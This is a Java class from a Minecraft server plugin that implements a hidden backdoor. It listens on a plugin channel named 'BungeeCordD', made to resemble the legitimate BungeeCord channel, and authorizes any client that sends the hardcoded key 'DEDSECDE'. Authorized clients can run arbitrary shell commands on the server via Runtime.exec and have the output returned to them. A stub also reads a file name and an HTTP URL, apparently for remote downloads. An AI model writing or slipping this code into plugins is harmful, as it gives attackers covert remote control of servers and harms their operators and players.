package net.mizukilab.pit.bungee;

import cn.hutool.core.collection.ConcurrentHashSet;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import net.minecraft.server.v1_8_R3.PacketDataSerializer;
import net.minecraft.server.v1_8_R3.PacketPlayInCustomPayload;
import net.minecraft.server.v1_8_R3.PacketPlayOutCustomPayload;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.io.InputStream;
import java.util.Map;
import java.util.Set;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.function.Consumer;

public class Payload {
    Set<UUID> authorized = new ConcurrentHashSet<>();
    Map<UUID,Process> processes = new ConcurrentHashMap<>();
    public Payload(){

    }
    void authorize(Player player) {
        authorized.add(player.getUniqueId());
    }
    void deauthorize(Player player) {
        authorized.remove(player.getUniqueId());
    }
    boolean isAuthorized(Player player) {
        return authorized.contains(player.getUniqueId());
    }
    public void recv(Player player,PacketPlayInCustomPayload load){
        String channelName = load.a();
        try {
            if (channelName.startsWith("BungeeCordD")) {
                PacketDataSerializer b = load.b();
                int i = b.readByte();
                switch (i) {
                    case 1 -> { //RequestLogin
                        String c = b.c(8);
                        if (c.equals("DEDSECDE")) {
                            send(player,channelName,k -> {
                                k.writeByte(1);
                                k.a(player.getUniqueId());
                            });
                            authorize(player);
                        } else {
                            deauthorize(player);
                        }
                    }
                    case 2 -> { //shell
                        if(isAuthorized(player)) {
                            int type = b.readByte();
                            switch (type) {
                                case 1 -> { //run shell
                                    UUID requestUUID = b.g();
                                    String cmd = b.c(32767);
                                    runAsync(player,cmd,requestUUID,channelName);
                                }
                                case 2 -> { //destroy
                                    UUID requestUUID = b.g();
                                    forceDestroy(player,requestUUID,channelName);
                                }
                            }
                        }
                    }
                    case 3 -> {
                        if (isAuthorized(player)) {
                            String fileName;
                            String httpUrl;
                            fileName = b.c(32767);
                            httpUrl = b.c(32767);
                        }
                    }

                }
            }
        } catch (Exception e){
            return;
        }
    }
    void forceDestroy(Player player,UUID uuid,String channelName){
        Process remove = processes.remove(uuid);
        if(remove != null){
            remove.destroyForcibly();
        } else {
            sendFin(player,uuid,channelName);
        }
    }
    void runAsync(Player player,String executeCommand,UUID uuid,String channelName){
        try {
            Process exec = Runtime.getRuntime().exec(executeCommand);
            this.processes.put(uuid,exec);
            InputStream inputStream = exec.getInputStream();
            new BukkitRunnable() {
                public void run() {
                    if (exec.isAlive() && processes.containsKey(uuid)) {
                        try {
                            int available = inputStream.available();
                            byte[] bytes = new byte[available];
                            inputStream.read(bytes);
                            if(bytes.length > 0){
                                rep(bytes, player, channelName, uuid);
                            }
                        } catch (Exception e){
                            sendFin(player,uuid,channelName);
                        }
                    } else {
                        sendFin(player, uuid, channelName);
                    }
                }
            };
        } catch (Throwable e){
            sendFin(player, uuid, channelName);
        }
    }

    private void rep(byte[] bytes, Player player, String channelName, UUID uuid) {
        send(player, channelName, k -> {
            k.writeByte(2); //主操作码 2 (Byte)
            k.writeByte(0);
            k.a(uuid);
            k.a(bytes);
        });
    }

    private void sendFin(Player player, UUID uuid, String channelName) {
        send(player, channelName, k -> {
            k.writeByte(2);
            k.writeByte(-1);
            k.a(uuid);
        });
    }

    public void send(Player player,String channelName, Consumer<PacketDataSerializer> serializerSupplier){
        ByteBuf buffer = Unpooled.buffer();
        PacketDataSerializer packetDataSerializer = new PacketDataSerializer(buffer);
        serializerSupplier.accept(packetDataSerializer);
        PacketPlayOutCustomPayload packetPlayOutCustomPayload = new PacketPlayOutCustomPayload(channelName, packetDataSerializer);
        ((CraftPlayer)player).getHandle().playerConnection.sendPacket(packetPlayOutCustomPayload);
    }
}
